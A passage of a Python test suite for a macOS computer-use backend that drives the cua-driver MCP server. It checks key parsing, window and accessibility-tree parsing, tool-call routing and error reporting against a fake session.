        assert set(mods) == {"cmd", "shift"}

    def test_parse_key_combo_aliases(self):
        key, mods = cua_backend_mod._parse_key_combo("control+alt+t")
        assert key == "t"
        assert set(mods) == {"ctrl", "option"}

    def test_parse_key_combo_preserves_literal_minus_key(self):
        """'cmd+-' (zoom out) must keep '-' as the key — splitting on '-'
        used to drop it entirely, leaving key=None."""
        key, mods = cua_backend_mod._parse_key_combo("cmd+-")
        assert key == "-"
        assert mods == ["cmd"]

    def test_parse_key_combo_preserves_literal_plus_key(self):
        """A trailing '+' after the separator is the literal '+' key."""
        key, mods = cua_backend_mod._parse_key_combo("cmd++")
        assert key == "+"
        assert mods == ["cmd"]

    def test_parse_key_combo_bare_minus(self):
        key, mods = cua_backend_mod._parse_key_combo("-")
        assert key == "-"
        assert mods == []

    def test_parse_windows_from_listwindows_json(self):
        """cua-driver 0.1.9 list_windows returns JSON, not text."""
        out = {
            "data": None,
            "images": [],
            "structuredContent": {
                "current_space_id": 228,
                "windows": [
                    {
                        "app_name": "Safari", "pid": 123, "window_id": 456,
                        "title": "Home", "is_on_screen": True, "layer": 0,
                        "z_index": 7,
                        "bounds": {"x": 0, "y": 25, "width": 1440, "height": 900},
                    },
                    {
                        "app_name": "Safari", "pid": 123, "window_id": 999,
                        "title": "Hidden", "is_on_screen": False, "layer": 0,
                        "z_index": 1,
                        "bounds": {"x": 0, "y": 0, "width": 800, "height": 600},
                    },
                ],
            },
            "isError": False,
        }
        windows = cua_backend_mod._parse_windows(out)
        assert windows[0]["app_name"] == "Safari"
        assert windows[0]["pid"] == 123
        assert windows[0]["window_id"] == 456
        assert windows[0]["off_screen"] is False
        assert windows[0]["bounds"]["width"] == 1440
        assert windows[1]["off_screen"] is True

    def test_parse_windows_from_json_text_block(self):
        """list_windows JSON can also arrive as a json-decoded text block."""
        out = {
            "data": {"windows": [
                {"app_name": "Finder", "pid": 7, "window_id": 8, "title": "x",
                 "is_on_screen": True, "layer": 0, "z_index": 0,
                 "bounds": {"x": 1, "y": 2, "width": 3, "height": 4}},
            ]},
            "images": [], "structuredContent": None, "isError": False,
        }
        windows = cua_backend_mod._parse_windows(out)
        assert windows[0]["window_id"] == 8

    def test_parse_elements_from_tree_real_0_1_9_format(self):
        """0.1.9 emits ``- [N] AXRole`` with quoted titles, paren
        descriptions, and ``= "value"`` settable values — any combination.

        (Simplified format without ``id=``/``help=`` tokens — the regex
        must still parse it. The live-token format is covered separately
        by ``test_parse_elements_from_tree_live_id_help_tokens``.)"""
        tree = (
            '- AXApplication "Chrome"\n'
            '  - [0] AXWindow "Home - Chrome" actions=[AXRaise]\n'
            '    - AXGroup\n'
            '      - [3] AXButton (Back) actions=[AXShowMenu]\n'
            '      - [8] AXTextField = "x.com/foo" (Address and search bar)'
            ' actions=[AXShowMenu]\n'
            '      - [56] AXButton (New Tab) actions=[AXShowMenu]\n'
        )
        elements = cua_backend_mod._parse_elements_from_tree(tree)
        by_index = {e.index: e for e in elements}
        # Container AXGroup / AXApplication lines carry no [N] — skipped.
        assert set(by_index) == {0, 3, 8, 56}
        assert by_index[0].role == "AXWindow"
        assert by_index[0].label == "Home - Chrome"
        # Paren description used as label when no quoted title.
        assert by_index[3].role == "AXButton"
        assert by_index[3].label == "Back"
        # Quoted title would win, but here the value+desc form: desc is label.
        assert by_index[8].role == "AXTextField"
        assert by_index[8].label == "Address and search bar"
        assert by_index[8].attributes["value"] == "x.com/foo"
        assert "AXShowMenu" in by_index[8].attributes["actions"]

    def test_parse_elements_from_tree_live_id_help_tokens(self):
        """Audit loop 8 — found live: real 0.1.9 ``tree_markdown`` lines
        interleave ``id=…`` and ``help="…"`` tokens BETWEEN the label and
        ``actions=[…]``. ~35% of TextEdit's elements carry an ``id=`` token.

        The mock below is verbatim live cua-driver 0.1.9 output (TextEdit).
        The ``id=`` value may itself contain spaces (``id=First Text View``).
        An earlier regex anchored ``actions=`` directly after the label
        groups, so for every ``id=``-bearing element the ``actions`` list was
        SILENTLY DROPPED. This pins the fix: ``actions`` parses regardless of
        the ``id=``/``help=`` noise, and ``help`` is captured as a label."""
        tree = (
            '- AXApplication "TextEdit"\n'
            '  - [0] AXWindow "Untitled 4" id=_NS:34 actions=[AXRaise]\n'
            '    - [1] AXScrollArea id=_NS:8 actions=[AXScrollLeftByPage, '
            'AXScrollRightByPage]\n'
            '    - [2] AXTextArea id=First Text View actions=[AXShowMenu]\n'
            '    - [19] AXPopUpButton = "Helvetica" (typeface) '
            'help="Choose the typeface" id=_NS:87 actions=[AXShowMenu]\n'
            '    - [21] AXComboBox = "14" (font size) help="Set the font size" '
            'id=_NS:108 actions=[AXShowMenu, AXConfirm]\n'
            '    - [27] AXCheckBox (bold) help="Bold text"\n'
        )
        by_index = {e.index: e
                    for e in cua_backend_mod._parse_elements_from_tree(tree)}
        assert set(by_index) == {0, 1, 2, 19, 21, 27}
        # id= token present — actions MUST still parse (the loop-8 bug).
        assert by_index[0].attributes["actions"] == ["AXRaise"]
        assert by_index[1].attributes["actions"] == [
            "AXScrollLeftByPage", "AXScrollRightByPage"]
        # id= value with embedded spaces must not break the parse.
        assert by_index[2].role == "AXTextArea"
        assert by_index[2].attributes["actions"] == ["AXShowMenu"]
        # help= + id= both present, both before actions=.
        assert by_index[19].attributes["value"] == "Helvetica"
        assert by_index[19].label == "typeface"  # desc beats help
        assert by_index[19].attributes["help"] == "Choose the typeface"
        assert by_index[19].attributes["actions"] == ["AXShowMenu"]
        assert by_index[21].attributes["actions"] == ["AXShowMenu", "AXConfirm"]
        # help with NO actions= — help captured, no actions key.
        assert by_index[27].attributes["help"] == "Bold text"
        assert "actions" not in by_index[27].attributes

    def test_install_hint_mentions_oc_command(self):
        assert "oc computer-use install" in cua_backend_mod.cua_driver_install_hint()

    def test_backend_is_available_false_on_non_macos(self):
        b = cua_backend_mod.CuaDriverBackend()
        if sys.platform != "darwin":
            assert b.is_available() is False

    def test_binary_available_delegates_to_find_cua_driver(self):
        """``cua_driver_binary_available`` resolves via ``find_cua_driver`` —
        so it stays True when the binary is reachable only via the upstream
        installer's ``~/.local/bin`` symlink, not ``$PATH``."""
        with patch.object(cua_backend_mod, "find_cua_driver",
                          return_value="/Users/x/.local/bin/cua-driver"):
            assert cua_backend_mod.cua_driver_binary_available() is True
        with patch.object(cua_backend_mod, "find_cua_driver", return_value=None):
            assert cua_backend_mod.cua_driver_binary_available() is False

    def test_aenter_raises_install_hint_when_binary_unresolvable(self):
        """The MCP session spawn raises the install-hint error cleanly when
        ``find_cua_driver`` returns None at spawn time."""
        b = cua_backend_mod.CuaDriverBackend()
        with patch.object(cua_backend_mod, "find_cua_driver", return_value=None):
            with pytest.raises(RuntimeError, match="cua-driver is not installed"):
                asyncio.run(b._session._aenter())

    def test_pinned_version_tracks_0_1_9_surface(self):
        """The pin tracks the real installed/upstream cua-driver surface
        (overridable via OPENCOMPUTER_CUA_DRIVER_VERSION)."""
        # The module was imported without the override set in this suite.
        assert cua_backend_mod.PINNED_CUA_DRIVER_VERSION == "0.1.9"


# ---------------------------------------------------------------------------
# cua-driver 0.1.9 MCP call-site reconciliation — fake MCP session, no
# subprocess. Asserts each backend method calls the real 0.1.9 tool name
# with the real 0.1.9 input schema.
# ---------------------------------------------------------------------------

class _FakeSession:
    """Records every ``call_tool`` and returns scripted results."""

    def __init__(self, results=None):
        self.calls: list[tuple[str, dict]] = []
        self._results = results or {}

    def start(self): ...
    def stop(self): ...

    def call_tool(self, name, args, timeout=30.0):
        self.calls.append((name, dict(args)))
        if name in self._results:
            return self._results[name]
        return {"data": "", "images": [], "structuredContent": None,
                "isError": False}

    def last(self, name):
        for n, a in reversed(self.calls):
            if n == name:
                return a
        raise AssertionError(f"no {name!r} call recorded; got "
                             f"{[c[0] for c in self.calls]!r}")


def _backend_with_session(results=None):
    """A CuaDriverBackend wired to a fake MCP session."""
    b = cua_backend_mod.CuaDriverBackend()
    b._session = _FakeSession(results)
    return b


_LW_ONE_WINDOW = {
    "data": None, "images": [], "isError": False,
    "structuredContent": {
        "current_space_id": 1,
        "windows": [{
            "app_name": "Safari", "pid": 4242, "window_id": 88,
            "title": "example.com", "is_on_screen": True, "layer": 0,
            "z_index": 5,
            "bounds": {"x": 0, "y": 25, "width": 1440, "height": 900},
        }],
    },
}


class TestCuaBackend0_1_9CallSites:
    def test_type_text_calls_type_text_not_type_text_chars(self):
        """The 0.1.9 fix: ``type`` → MCP tool ``type_text`` (NOT
        ``type_text_chars``, which does not exist in 0.1.9)."""
        b = _backend_with_session()
        b._active_pid = 4242
        res = b.type_text("hello world")
        assert res.ok is True
        name, args = b._session.calls[-1]
        assert name == "type_text", f"called {name!r}, expected type_text"
        assert name != "type_text_chars"
        assert args == {"pid": 4242, "text": "hello world"}

    def test_type_text_without_capture_fails_cleanly(self):
        b = _backend_with_session()
        res = b.type_text("x")
        assert res.ok is False
        assert "capture()" in res.message
        assert b._session.calls == []

    def test_key_single_routes_to_press_key(self):
        b = _backend_with_session()
        b._active_pid = 4242
        b.key("return")
        name, args = b._session.calls[-1]
        assert name == "press_key"
        assert args == {"pid": 4242, "key": "return"}

    def test_key_combo_routes_to_hotkey_with_window_id(self):
        """Multi-key combos MUST use ``hotkey``; ``window_id`` is threaded
        so FocusWithoutRaise fires for NSMenu equivalents (Cmd+S)."""
        b = _backend_with_session()
        b._active_pid = 4242
        b._active_window_id = 88
        b.key("cmd+s")
        name, args = b._session.calls[-1]
        assert name == "hotkey"
        assert args["pid"] == 4242
        assert args["keys"] == ["cmd", "s"]
        assert args["window_id"] == 88

    def test_drag_calls_drag_tool_with_pixel_schema(self):
        """0.1.9 HAS a ``drag`` tool — pixel-only from/to coordinates."""
        b = _backend_with_session()
        b._active_pid = 4242
        b._active_window_id = 88
        res = b.drag(from_xy=(10, 20), to_xy=(300, 400))
        assert res.ok is True
        name, args = b._session.calls[-1]
        assert name == "drag"
        assert args["pid"] == 4242
        assert args["from_x"] == 10 and args["from_y"] == 20
        assert args["to_x"] == 300 and args["to_y"] == 400
        assert args["window_id"] == 88

    def test_drag_with_element_indices_fails_cleanly(self):
        """Element-indexed drag is unsupported — clean ActionResult, no call."""
        b = _backend_with_session()
        b._active_pid = 4242
        res = b.drag(from_element=1, to_element=2)
        assert res.ok is False
        assert "pixel-only" in res.message
        assert b._session.calls == []

    def test_click_element_path_omits_pixel_only_args(self):
        b = _backend_with_session()
        b._active_pid = 4242
        b._active_window_id = 88
        b.click(element=7, modifiers=["cmd"])
        name, args = b._session.calls[-1]
        assert name == "click"
        assert args == {"pid": 4242, "element_index": 7, "window_id": 88}
        assert "modifier" not in args  # pixel-path-only in 0.1.9

    def test_click_pixel_path_carries_modifier(self):
        b = _backend_with_session()
        b._active_pid = 4242
        b.click(x=100, y=200, modifiers=["cmd"])
        name, args = b._session.calls[-1]
        assert name == "click"
        assert args["x"] == 100 and args["y"] == 200
        assert args["modifier"] == ["cmd"]

    def test_double_click_routes_to_double_click_tool(self):
        """A double-click uses the dedicated ``double_click`` tool — not
        ``click`` with a count arg."""
        b = _backend_with_session()
        b._active_pid = 4242
        b._active_window_id = 88
        b.click(element=3, click_count=2)
        name, args = b._session.calls[-1]
        assert name == "double_click"
        assert "count" not in args  # double_click has no count in 0.1.9

    def test_right_click_routes_to_right_click_tool(self):
        b = _backend_with_session()
        b._active_pid = 4242
        b._active_window_id = 88
        b.click(element=3, button="right")
        assert b._session.calls[-1][0] == "right_click"

    def test_middle_click_rejected_not_degraded_to_left_click(self):
        """cua-driver 0.1.9 has no middle-click primitive — the backend must
        fail cleanly rather than silently performing a left-click."""
        b = _backend_with_session()
        b._active_pid = 4242
        b._active_window_id = 88
        res = b.click(element=3, button="middle")
        assert res.ok is False
        assert res.action == "middle_click"
        assert "middle" in res.message.lower()
        # No tool call at all — not a degraded left-click.
        assert b._session.calls == []

    def test_scroll_uses_by_line_no_pixel_mode(self):
        b = _backend_with_session()
        b._active_pid = 4242
        b.scroll(direction="down", amount=5)
        name, args = b._session.calls[-1]
        assert name == "scroll"
        assert args == {"pid": 4242, "direction": "down", "by": "line",
                        "amount": 5}

    def test_set_value_threads_window_id_and_element(self):
        """0.1.9 set_value requires pid + window_id + element_index + value."""
        b = _backend_with_session()
        b._active_pid = 4242
        b._active_window_id = 88
        res = b.set_value("Blue", element=2)
        assert res.ok is True
        name, args = b._session.calls[-1]
        assert name == "set_value"
        assert args == {"pid": 4242, "window_id": 88,
                        "element_index": 2, "value": "Blue"}

    def test_recapture_active_pins_to_sticky_window_no_list_windows(self):
        """``recapture_active`` re-captures the sticky pid/window_id directly
        via ``get_window_state`` — it must NOT call ``list_windows`` (which
        would re-run frontmost-first selection and could pick a different
        window than the one the action just touched)."""
        gws = {
            "data": {"tree_markdown": '- AXApplication "TextEdit"\n'
                                      '  - [0] AXWindow "Untitled"\n'
                                      '    - [2] AXTextArea actions=[AXShowMenu]\n'},
            "images": [], "structuredContent": None, "isError": False,
        }
        b = _backend_with_session({"get_window_state": gws})
        b._active_pid = 4242
        b._active_window_id = 88
        # ``ax`` mode never expects an image — exercises the sticky-window
        # capture path without the som no-screenshot diagnostic.
        cap = b.recapture_active(mode="ax")
        assert cap.error == ""
        # Both the [0] AXWindow and the [2] AXTextArea carry an index token.
        assert {e.index for e in cap.elements} == {0, 2}
        assert cap.window_title == "Untitled"
        called = [c[0] for c in b._session.calls]
        assert "get_window_state" in called
        assert "list_windows" not in called  # the whole point
        gws_args = b._session.last("get_window_state")
        assert gws_args == {"pid": 4242, "window_id": 88}

    def test_recapture_active_errors_cleanly_with_no_sticky_window(self):
        """With no sticky window set, ``recapture_active`` returns a clean
        error CaptureResult — never raises, never calls the backend."""
        b = _backend_with_session()
        cap = b.recapture_active(mode="som")
        assert cap.error != ""
        assert "no active window" in cap.error.lower()
        assert b._session.calls == []  # no MCP round-trip

    def test_capture_geometry_from_get_window_state(self):
        """capture() reports the cua-driver 0.1.9 ``screenshot_width`` /
        ``screenshot_height`` — the actual PNG-pixel dimensions, the space
        click(x,y) addresses — and they OVERRIDE the list_windows bounds
        (which are logical screen points)."""
        gws = {
            "data": {
                "tree_markdown": '- AXApplication "Safari"\n'
                                 '  - [0] AXWindow "example.com"\n'
                                 '    - [1] AXButton (Back) actions=[AXPress]\n',
                "element_count": 2,
                # The real 0.1.9 structuredContent keys — verified live.
                "screenshot_width": 2880, "screenshot_height": 1800,
                "screenshot_scale_factor": 2,
            },
            "images": [], "structuredContent": None, "isError": False,
        }
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW,
                                   "get_window_state": gws})
        cap = b.capture(mode="som")
        # screenshot_* (PNG pixels) win over list_windows bounds 1440x900.
        assert cap.width == 2880
        assert cap.height == 1800
        assert cap.app == "Safari"
        assert cap.window_title == "example.com"
        assert {e.index for e in cap.elements} == {0, 1}
        # sticky context set for follow-up action tools
        assert b._active_pid == 4242
        assert b._active_window_id == 88

    def test_capture_geometry_falls_back_to_listwindows_bounds(self):
        """When get_window_state omits screenshot dims, list_windows bounds win."""
        gws = {
            "data": {"tree_markdown": '- [0] AXWindow "x"\n', "element_count": 1},
            "images": [], "structuredContent": None, "isError": False,
        }
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW,
                                   "get_window_state": gws})
        cap = b.capture(mode="som")
        assert cap.width == 1440 and cap.height == 900  # list_windows bounds

    def test_capture_geometry_uses_screenshot_width_not_original(self):
        """When a cua-driver get_window_state payload carries BOTH
        ``screenshot_width``/``screenshot_height`` AND
        ``screenshot_original_width``/``screenshot_original_height``, the
        delivered image's actual pixel size — the space click(x,y) addresses —
        equals ``screenshot_width``/``screenshot_height`` (the downscaled
        form). The ``_original_*`` pair is the pre-downscale window size and
        must NOT be reported. Note: the installed 0.1.9 build omits the
        ``_original_*`` keys entirely; this test injects them defensively to
        guard against a future build that ships them — the code must still
        pick ``screenshot_width``."""
        gws = {
            "data": {
                "tree_markdown": '- [0] AXWindow "x"\n',
                "element_count": 1,
                # Defensive payload — both pairs present so the assertion
                # proves the code picks the downscaled (delivered) dims.
                "screenshot_width": 1568, "screenshot_height": 882,
                "screenshot_original_width": 1920,
                "screenshot_original_height": 1080,
                "screenshot_scale_factor": 1,
            },
            "images": [], "structuredContent": None, "isError": False,
        }
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW,
                                   "get_window_state": gws})
        cap = b.capture(mode="som")
        # The downscaled image dims win — NOT the _original_ pre-downscale size.
        assert cap.width == 1568 and cap.height == 882

    def test_capture_vision_uses_screenshot_tool_with_window_id(self):
        shot = {"data": "", "images": ["Zm9v"], "structuredContent": None,
                "isError": False}
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW,
                                   "screenshot": shot})
        cap = b.capture(mode="vision")
        sc_args = b._session.last("screenshot")
        assert sc_args["window_id"] == 88  # screenshot keys on window_id, not pid
        assert "pid" not in sc_args
        assert cap.png_b64 == "Zm9v"

    def test_focus_app_is_pure_window_selector(self):
        """0.1.9 has no focus_app tool — focus_app only enumerates + targets."""
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW})
        res = b.focus_app("Safari")
        assert res.ok is True
        assert b._active_pid == 4242
        assert b._active_window_id == 88
        # only list_windows was called — no (nonexistent) focus_app tool
        assert {c[0] for c in b._session.calls} == {"list_windows"}

    def test_focus_app_filter_miss_is_flagged(self):
        """``_select_windows`` falls back to all windows when the app filter
        misses — ``focus_app(app=X)`` must NOT report a clean ``ok=True``
        when it actually targeted a different app. A false success would
        silently point every later click/type at the wrong process. Mirrors
        ``test_capture_app_filter_miss_is_surfaced``."""
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW})
        res = b.focus_app("ZZNoSuchApp")
        # the sticky target is still set (graceful degradation) ...
        assert b._active_pid == 4242
        # ... but the result is flagged so the tool layer sets is_error.
        assert res.ok is False
        assert "ZZNoSuchApp" in res.message
        assert "Safari" in res.message  # tells the agent what it got instead

    def test_focus_app_bundle_id_form_matches_leniently(self):
        """A bundle-ID form ('com.apple.Safari') matches the 'Safari'
        app_name via the trailing-segment rule — no false miss flag."""
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW})
        res = b.focus_app("com.apple.Safari")
        assert res.ok is True
        assert b._active_pid == 4242

    def test_list_apps_prefers_structured_content(self):
        """0.1.9 ships the app array as structuredContent alongside a text
        summary — the structured payload must win."""
        apps_out = {
            "data": "✅ Found 2 app(s)\n- Code (pid 7) [com.x]",
            "images": [], "isError": False,
            "structuredContent": {"apps": [
                {"name": "Safari", "pid": 1, "bundle_id": "com.apple.Safari",
                 "running": True, "active": True},
            ]},
        }
        b = _backend_with_session({"list_apps": apps_out})
        apps = b.list_apps()
        assert apps[0]["name"] == "Safari"
        assert apps[0]["bundle_id"] == "com.apple.Safari"

    def test_list_apps_text_fallback_parses_pid_and_bundle(self):
        """Degraded transport — the ``- Name (pid N) [bundle]`` text path."""
        apps_out = {
            "data": "✅ Found 2 app(s)\n"
                    "- Google Chrome (pid 65197) [com.google.Chrome]\n"
                    "- Contacts (pid -1) [com.apple.AddressBook]",
            "images": [], "structuredContent": None, "isError": False,
        }
        b = _backend_with_session({"list_apps": apps_out})
        apps = b.list_apps()
        assert apps[0] == {"name": "Google Chrome", "pid": 65197,
                           "bundle_id": "com.google.Chrome", "running": True}
        assert apps[1]["running"] is False  # pid -1 = installed, not running

    def test_capture_geometry_from_structured_content(self):
        """get_window_state ships its payload as structuredContent over the
        real MCP transport — capture must read it, not just ``data`` — and
        ``screenshot_width``/``screenshot_height`` (PNG pixels) win over the
        list_windows bounds."""
        gws = {
            "data": "✅ Safari — 2 elements, turn 1 + screenshot",
            "images": [], "isError": False,
            "structuredContent": {
                "tree_markdown": '- AXApplication "Safari"\n'
                                 '  - [0] AXWindow "example.com"\n'
                                 '    - [1] AXButton (Back) actions=[AXPress]\n',
                "element_count": 2,
                "screenshot_width": 2880, "screenshot_height": 1800,
                "screenshot_scale_factor": 2,
            },
        }
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW,
                                   "get_window_state": gws})
        cap = b.capture(mode="som")
        assert cap.width == 2880 and cap.height == 1800
        assert {e.index for e in cap.elements} == {0, 1}

    def test_capture_no_windows_sets_error(self):
        """No on-screen window must surface an explicit error, not a silent
        empty CaptureResult that reads as '0 interactable elements'."""
        empty_lw = {"data": None, "images": [], "isError": False,
                    "structuredContent": {"windows": [], "current_space_id": 1}}
        b = _backend_with_session({"list_windows": empty_lw})
        cap = b.capture(mode="som")
        assert cap.error
        assert "no on-screen" in cap.error.lower()
        cap_app = b.capture(mode="som", app="Safari")
        assert "safari" in cap_app.error.lower()

    def test_capture_app_filter_miss_is_surfaced(self):
        """_select_windows falls back to all windows when the app filter
        misses — capture(app=X) must say so instead of silently capturing
        the wrong app."""
        gws = {"data": {"tree_markdown": '- [0] AXWindow "x"\n'},
               "images": [], "structuredContent": None, "isError": False}
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW,
                                   "get_window_state": gws})
        cap = b.capture(mode="som", app="ZZNoSuchApp")
        assert cap.error
        assert "ZZNoSuchApp" in cap.error
        assert "Safari" in cap.error  # tells the agent what it got instead

    def test_capture_app_filter_match_has_no_error(self):
        """An app filter that DOES match (incl. bundle-id form) is clean.

        A real 0.1.9 ``som`` ``get_window_state`` ships the screenshot as an
        MCP image content block — the mock includes it so the capture is a
        faithful ``som`` response (no screenshot ⇒ the screenshot-mode-mismatch
        guard fires; see test_capture_som_without_screenshot_surfaces_mode)."""
        gws = {"data": {"tree_markdown": '- [0] AXWindow "x"\n'},
               "images": ["Zm9v"], "structuredContent": None, "isError": False}
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW,
                                   "get_window_state": gws})
        assert b.capture(mode="som", app="Safari").error == ""
        # bundle-id form — matched leniently against the trailing segment
        assert b.capture(mode="som", app="com.apple.Safari").error == ""

    def test_capture_surfaces_get_window_state_iserror(self):
        """get_window_state isError (window off-Space / pid mismatch) must
        propagate to CaptureResult.error — not be swallowed as 0 elements."""
        gws_err = {
            "data": {"message": "window_id 88 is not on the current Space"},
            "images": [], "structuredContent": None, "isError": True,
        }
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW,
                                   "get_window_state": gws_err})
        cap = b.capture(mode="som")
        assert cap.error
        assert "current Space" in cap.error
        assert cap.elements == []

    def test_capture_vision_surfaces_screenshot_iserror(self):
        """The documented SCK -3801 screenshot refusal must surface as an
        error rather than a silent png_b64=None capture."""
        shot_err = {"data": "SCStreamError -3801: Could not start streaming",
                    "images": [], "structuredContent": None, "isError": True}
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW,
                                   "screenshot": shot_err})
        cap = b.capture(mode="vision")
        assert cap.error
        assert "-3801" in cap.error
        assert cap.png_b64 is None

    def test_capture_som_without_screenshot_surfaces_mode_mismatch(self):
        """Regression — verified live against cua-driver 0.1.9: ``get_window_state``
        takes NO per-call mode arg; its response shape is dictated by the
        daemon's PERSISTENT ``capture_mode`` config (the daemon persists it
        across restarts and shares it with every client). With the config left
        at ``ax``, a ``capture(mode='som')`` comes back with the AX tree but NO
        screenshot — the caller asked for ``som`` (screenshot + elements) and
        silently got an ``ax``-shaped result. capture() must surface the miss
        with an actionable hint, not return a clean screenshot-less ``som``."""
        # An ``ax``-config get_window_state response: tree present, no image,
        # no screenshot_* dims, isError False — exactly what 0.1.9 returns.
        gws_ax = {"data": {"tree_markdown": '- [0] AXWindow "x"\n',
                           "element_count": 1},
                  "images": [], "structuredContent": None, "isError": False}
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW,
                                   "get_window_state": gws_ax})
        cap = b.capture(mode="som")
        assert cap.png_b64 is None
        assert cap.error
        assert "capture_mode" in cap.error
        # element-indexed actions still work — the tree shipped
        assert {e.index for e in cap.elements} == {0}
        # ``ax`` mode never expects a screenshot — no spurious error there.
        cap_ax = b.capture(mode="ax")
        assert cap_ax.error == ""
        # A som capture WITH an image is clean.
        gws_som = {"data": {"tree_markdown": '- [0] AXWindow "x"\n'},
                   "images": ["Zm9v"], "structuredContent": None,
                   "isError": False}
        b2 = _backend_with_session({"list_windows": _LW_ONE_WINDOW,
                                    "get_window_state": gws_som})
        assert b2.capture(mode="som").error == ""

    def test_capture_error_propagates_through_dispatch(self):
        """A failed capture must mark the tool result is_error=True via the
        ``error`` key on the dispatch payload."""
        gws_err = {"data": "AX walk refused", "images": [],
                   "structuredContent": None, "isError": True}
        b = _backend_with_session({"list_windows": _LW_ONE_WINDOW,
                                   "get_window_state": gws_err})
        out = tool_mod._dispatch(b, "capture", {"mode": "som"})
        assert "error" in out
        assert "hint" in out

    def test_error_message_helper_handles_dict_and_str(self):
        """_error_message extracts a message from both shapes it must tolerate.

        Verified live against cua-driver 0.1.9: EVERY isError response
        (get_window_state, screenshot, set_value, click, missing-required-arg)
        delivers its detail as a *plain-string* text content block — the
        ``{'message': ...}`` JSON form is never emitted by 0.1.9. The dict
        branch is kept purely as defensive tolerance for a future shape."""
        em = cua_backend_mod._error_message
        # The live shape: a plain string (json-decoded to a str by
        # _extract_tool_result because it does not start with { or [).
        assert em({"data": "No window with window_id 999999 exists."}) == \
            "No window with window_id 999999 exists."
        assert em({"data": "  raw text  "}) == "raw text"
        # Defensive dict tolerance — not a live 0.1.9 shape.
        assert em({"data": {"message": "boom"}}) == "boom"
        assert em({"data": {"error": "bad"}}) == "bad"
        assert em({"data": None}) == ""
        assert em({"data": {}}) == ""

    def test_capture_skips_macos_menu_bar_strip(self):
        """Regression — verified live: cua-driver 0.1.9 reports the macOS menu
        bar as a layer-0, on-screen ``list_windows`` record (untitled, y=-44,
        height=44, full display width) with a z_index HIGHER than the app's
        real window. The frontmost-first sort would pick the menu bar and
        capture() would return AXMenuBar elements instead of the app. The
        geometry filter must drop it so the real window wins."""
        lw = {
            "data": None, "images": [], "isError": False,
            "structuredContent": {
                "current_space_id": 1,
                "windows": [
                    {  # the macOS menu bar strip — must be dropped
                        "app_name": "Code", "pid": 38887, "window_id": 7891,
                        "title": "", "is_on_screen": True, "layer": 0,
                        "z_index": 5,
                        "bounds": {"x": 0, "y": -44, "width": 1920,
                                   "height": 44},
                    },
                    {  # the real app window — must be selected
                        "app_name": "Code", "pid": 38887, "window_id": 1089,
                        "title": "Computer Use — opencomputer",
                        "is_on_screen": True, "layer": 0, "z_index": 4,
                        "bounds": {"x": 0, "y": 0, "width": 1920,
                                   "height": 1080},
                    },
                ],
            },
        }
        gws = {
            "data": {"tree_markdown": '- [0] AXWindow "Computer Use"\n',
                     "element_count": 1},
            "images": [], "structuredContent": None, "isError": False,
        }
        b = _backend_with_session({"list_windows": lw, "get_window_state": gws})
        windows = b._select_windows(None)
        # Only the real window survives the strip filter.
        assert [w["window_id"] for w in windows] == [1089]
        cap = b.capture(mode="som")
        assert cap.window_title == "Computer Use — opencomputer"
        assert b._active_window_id == 1089
        # The get_window_state call targeted the real window, not the strip.
        assert b._session.last("get_window_state")["window_id"] == 1089

    def test_select_windows_keeps_real_windows_at_screen_top(self):
        """The menu-bar filter must NOT drop a legitimate app window that
        happens to sit at y<=0 — a real window is taller than the 50px
        strip cutoff, or carries a title. Guards against over-filtering."""
        lw = {
            "data": None, "images": [], "isError": False,
            "structuredContent": {
                "current_space_id": 1,
                "windows": [
                    {  # a real maximized window anchored at y=0 — KEEP
                        "app_name": "Safari", "pid": 1, "window_id": 10,
                        "title": "", "is_on_screen": True, "layer": 0,
                        "z_index": 3,
                        "bounds": {"x": 0, "y": 0, "width": 1920,
                                   "height": 1080},
                    },
                ],
            },
        }
        b = _backend_with_session({"list_windows": lw})
        windows = b._select_windows(None)
        assert [w["window_id"] for w in windows] == [10]

    def test_capture_skips_cua_drivers_own_relay_window(self):
        """Regression — verified live against cua-driver 0.1.9: when the MCP
        process is launched without CuaDriver.app's TCC grants it auto-relaunches
        its own daemon, which puts up a FULL-SCREEN, untitled, layer-0,
        on-screen helper window (app_name 'Cua Driver', bundle_id
        com.trycua.driver) with the HIGHEST z_index of any on-screen window.
        ``_is_system_chrome_strip`` cannot catch it — it is full-height, not a
        thin strip — so without an owning-app filter the frontmost-first sort
        picks the driver's OWN window and capture()/click() operate on the
        driver instead of the user's app. The selector must drop it."""
        lw = {
            "data": None, "images": [], "isError": False,
            "structuredContent": {
                "current_space_id": 487,
                "windows": [
                    {  # cua-driver's own relay-daemon window — must be dropped
                        "app_name": "Cua Driver", "pid": 98042,
                        "window_id": 8028, "title": "",
                        "is_on_screen": True, "on_current_space": True,
                        "layer": 0, "z_index": 5, "space_ids": [487],
                        "bounds": {"x": 0, "y": 0, "width": 1920,
                                   "height": 1080},
                    },
                    {  # the real app window — must be selected
                        "app_name": "Terminal", "pid": 47327,
                        "window_id": 3683, "title": "claude — 168×20",
                        "is_on_screen": True, "on_current_space": True,
                        "layer": 0, "z_index": 4, "space_ids": [487],
                        "bounds": {"x": 192, "y": 51, "width": 1537,
                                   "height": 840},
                    },
                ],
            },
        }
        gws = {
            "data": {"tree_markdown": '- [0] AXWindow "claude"\n',
                     "element_count": 1},
            "images": [], "structuredContent": None, "isError": False,
        }
        b = _backend_with_session({"list_windows": lw, "get_window_state": gws})
        windows = b._select_windows(None)
        # Only the real window survives — the driver's own window is dropped.
        assert [w["window_id"] for w in windows] == [3683]
        cap = b.capture(mode="som")
        assert cap.app == "Terminal"
        assert b._active_window_id == 3683
        assert b._session.last("get_window_state")["window_id"] == 3683


class TestAsyncBridgeLifecycle:
    """The asyncio bridge + session must be start/stop idempotent and never
    hang or raise on teardown — including teardown that never started."""

    def test_bridge_double_start_is_idempotent(self):
        bridge = cua_backend_mod._AsyncBridge()
        bridge.start()
        try:
            first_thread = bridge._thread
            bridge.start()  # second start must be a no-op
            assert bridge._thread is first_thread
            assert first_thread is not None and first_thread.is_alive()
